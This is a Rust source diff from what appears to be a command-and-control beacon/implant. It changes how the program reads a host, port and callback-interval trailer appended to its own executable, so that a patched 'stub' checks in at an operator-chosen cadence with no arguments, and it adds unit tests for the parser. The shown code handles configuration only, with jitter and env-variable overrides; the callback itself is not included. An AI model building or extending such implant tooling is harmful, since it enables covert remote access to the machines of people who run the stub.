@@ -297,8 +297,11 @@ impl Config {
             i += 1;
         }
 
-        // Trailer is the floor for host:port (a patched stub), CLI/env override.
-        let (t_host, t_port) = read_trailer_config().unwrap_or(("127.0.0.1".to_string(), 4444));
+        // Trailer is the floor for host:port[:interval] (a patched stub); CLI/env
+        // override each field independently. A beacon stub carries the callback
+        // interval as a third trailer field; an implant-style trailer has none.
+        let (t_host, t_port, t_interval) =
+            read_trailer_config().unwrap_or(("127.0.0.1".to_string(), 4444, None));
 
         let host = host
             .or_else(|| env("BEACON_HOST"))
@@ -308,6 +311,7 @@ impl Config {
             .unwrap_or(t_port);
         let interval_secs = interval
             .or_else(|| env("BEACON_INTERVAL").and_then(|s| s.parse().ok()))
+            .or(t_interval)
             .unwrap_or(5);
         let jitter_pct = jitter_pct
             .or_else(|| env("BEACON_JITTER").and_then(|s| s.parse().ok()))
@@ -327,10 +331,17 @@ fn env(key: &str) -> Option<String> {
     std::env::var(key).ok().filter(|s| !s.is_empty())
 }
 
-/// Read the appended-config trailer from this exe, if present. Same logic as
-/// the implant's `read_trailer_config`: reads only the last 512 bytes, finds
-/// the opaque magic, parses `host\0port\0`. Returns None if absent/malformed.
-fn read_trailer_config() -> Option<(String, u16)> {
+/// Read the appended-config trailer from this exe, if present. Reads only the
+/// last 512 bytes, finds the opaque magic, parses `host\0port\0[interval\0]`.
+///
+/// The optional third field is the callback interval in seconds, appended by
+/// the stub builder when generating a beacon (so a deployed stub checks in at
+/// the operator-chosen cadence with no args/env). The stock implant's trailer
+/// is `host\0port\0` only — it ignores any trailing bytes — so this format is
+/// backwards compatible: an implant-style trailer (no interval) yields
+/// `interval = None` and the beacon falls back to env/CLI/default. Returns
+/// None entirely if the magic is absent or host/port are malformed.
+fn read_trailer_config() -> Option<(String, u16, Option<u64>)> {
     let exe_path = std::env::current_exe().ok()?;
     let mut f = std::fs::File::open(&exe_path).ok()?;
     let len = f.metadata().ok()?.len();
@@ -342,7 +353,15 @@ fn read_trailer_config() -> Option<(String, u16)> {
     f.seek(std::io::SeekFrom::Start(start)).ok()?;
     let mut tail = Vec::with_capacity((len - start) as usize);
     f.read_to_end(&mut tail).ok()?;
-    let idx = find_subslice(&tail, TRAILER_MAGIC)?;
+    parse_trailer_tail(&tail)
+}
+
+/// Pure parser over a tail buffer (the last ~512 bytes of an exe). Split out of
+/// `read_trailer_config` so the field-parsing logic — including the optional
+/// interval — is unit-testable without writing a real exe. Returns
+/// `(host, port, optional interval_secs)`.
+fn parse_trailer_tail(tail: &[u8]) -> Option<(String, u16, Option<u64>)> {
+    let idx = find_subslice(tail, TRAILER_MAGIC)?;
     let body = &tail[idx + TRAILER_MAGIC.len()..];
     let host_end = body.iter().position(|&b| b == 0)?;
     let host = std::str::from_utf8(&body[..host_end]).ok()?.to_string();
@@ -352,7 +371,24 @@ fn read_trailer_config() -> Option<(String, u16)> {
     if host.is_empty() || port == 0 {
         return None;
     }
-    Some((host, port))
+    // Optional third field: interval seconds. Present only in a beacon trailer
+    // patched by the stub builder. `rest[port_end..]` starts at the NUL after
+    // port (or is empty if port ran to EOF); skip it to reach the interval.
+    let interval = if port_end < rest.len() {
+        let after = &rest[port_end + 1..];
+        let iv_end = after.iter().position(|&b| b == 0).unwrap_or(after.len());
+        if iv_end == 0 {
+            None
+        } else {
+            std::str::from_utf8(&after[..iv_end])
+                .ok()
+                .and_then(|s| s.parse::<u64>().ok())
+                .filter(|&v| v > 0)
+        }
+    } else {
+        None
+    };
+    Some((host, port, interval))
 }
 
 fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
@@ -468,8 +504,8 @@ mod tests {
         assert!((0.0..1.0).contains(&a));
     }
 
-    /// Trailer parse logic against a synthetic tail (mirrors the implant test;
-    /// read_trailer_config reads its own exe so we exercise the parse path).
+    /// Trailer parse logic against a synthetic tail. read_trailer_config reads
+    /// its own exe so we exercise parse_trailer_tail directly.
     #[test]
     fn parses_trailer_from_tail() {
         let mut tail = b"some padding bytes that are not the magic\0\0".to_vec();
@@ -478,21 +514,49 @@ mod tests {
         tail.push(0);
         tail.extend_from_slice(b"4455");
         tail.push(0);
-        let idx = find_subslice(&tail, TRAILER_MAGIC).expect("magic present");
-        let body = &tail[idx + TRAILER_MAGIC.len()..];
-        let host_end = body.iter().position(|&b| b == 0).unwrap();
-        let host = std::str::from_utf8(&body[..host_end]).unwrap().to_string();
-        let rest = &body[host_end + 1..];
-        let port_end = rest.iter().position(|&b| b == 0).unwrap();
-        let port: u16 = std::str::from_utf8(&rest[..port_end]).unwrap().parse().unwrap();
+        // implant-style trailer (no interval field) → interval None
+        let (host, port, interval) = parse_trailer_tail(&tail).expect("magic present");
         assert_eq!(host, "10.0.0.5");
         assert_eq!(port, 4455);
+        assert!(interval.is_none(), "no interval field => None");
+    }
+
+    /// A beacon trailer carries a third field (callback interval seconds).
+    /// parse_trailer_tail reads it; an implant-style trailer (no third field)
+    /// yields None — the backwards-compat guarantee.
+    #[test]
+    fn parses_trailer_interval_field() {
+        let mut tail = Vec::new();
+        tail.extend_from_slice(b"padding");
+        tail.extend_from_slice(TRAILER_MAGIC);
+        tail.extend_from_slice(b"10.0.0.5");
+        tail.push(0);
+        tail.extend_from_slice(b"4455");
+        tail.push(0);
+        tail.extend_from_slice(b"30"); // interval seconds
+        tail.push(0);
+        let (host, port, interval) = parse_trailer_tail(&tail).expect("magic present");
+        assert_eq!(host, "10.0.0.5");
+        assert_eq!(port, 4455);
+        assert_eq!(interval, Some(30));
+
+        // interval of 0 or garbage is treated as absent (fall back to default).
+        let mut bad = Vec::new();
+        bad.extend_from_slice(TRAILER_MAGIC);
+        bad.extend_from_slice(b"h");
+        bad.push(0);
+        bad.extend_from_slice(b"4455");
+        bad.push(0);
+        bad.extend_from_slice(b"0");
+        bad.push(0);
+        let (_, _, iv) = parse_trailer_tail(&bad).expect("magic present");
+        assert!(iv.is_none(), "interval 0 => None");
     }
 
     #[test]
     fn no_trailer_returns_none() {
         let tail = b"just some exe bytes with no magic marker at all".to_vec();
-        assert!(find_subslice(&tail, TRAILER_MAGIC).is_none());
+        assert!(parse_trailer_tail(&tail).is_none());
     }
 
     /// Config::resolve honors BEACON_INTERVAL / BEACON_JITTER env when no CLI
